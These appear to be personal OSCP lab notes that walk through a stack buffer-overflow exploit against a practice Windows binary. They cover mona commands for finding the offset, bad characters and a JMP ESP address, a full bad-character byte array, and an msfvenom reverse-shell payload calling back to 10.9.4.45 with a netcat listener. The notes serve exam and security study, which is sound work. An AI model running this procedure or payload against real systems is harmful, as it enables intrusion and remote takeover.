
```xfreerdp /u:admin /p:password /cert:ignore /v:<rhost>``` 

```sudo xfreerdp /dynamic-resolution +clipboard /cert:ignore /u:admin /p:password /v:<rhost>```

open software as administrator / open file vulnerableapps>>oscp>>oscp.exe and run 

```!mona config -set workingfolder c:\mona\%p```

python3 [[bufferOverflow/Mona/fuzzer.py]]  // get and add 400 bytes    

```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <total bytes> ``` 

```msf-pattern_create -l <total bytes>```

create and update payload

run payload python

```!mona findmsp -distance <bytes>```   //this will give us our EIP offset (cpu view)

update offset and rtn variable BBBB and erase payload

run server run exploit ==verify== that EIP got writen in register 424242   


Finding Bad Characters

1- generate bitesArray with mona excluding x00  // !mona bytearray -b "\x00"
2- run server 

1- generate biteArray with python          	//  makebadchar.py  \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

2- update exploit script with new payload
3- run exploit    // note ESP address

1- compare with mona				// !mona compare -f C:\mona\oscp\bytearray.bin -a `<address>`
2- update mona with bad characters , 		// !mona bytearray -b "\x00"
3- run server , 

1- update python script and run script
2- update payload in exploit
3- run exploit

1- compare with mona with new EIP register	//  !mona compare -f C:\mona\<oscp>\bytearray.bin -a ```<address>```  should say unmodified (you might have to add more bad cha)
2- get jump point  		 		//  !mona jmp -r esp -cpb 
3- run server , // below hooray we get bad char

!mona jmp -r esp -cpb 				// add bad characters	// we copy address from jump point

625011AF  becomes "\xaf\x11\x50\x62" 		//we put that in the return variable of exploit

```msfvenom -p windows/shell_reverse_tcp LHOST=10.9.4.45 LPORT=9500 -b '\x00\xaf\x11\x50\x62' EXITFUNC=thread -f python -v payload```

we add padding "\x90" * 16 


open a netcat on lport  

run exploit, and nc should pick it right up

















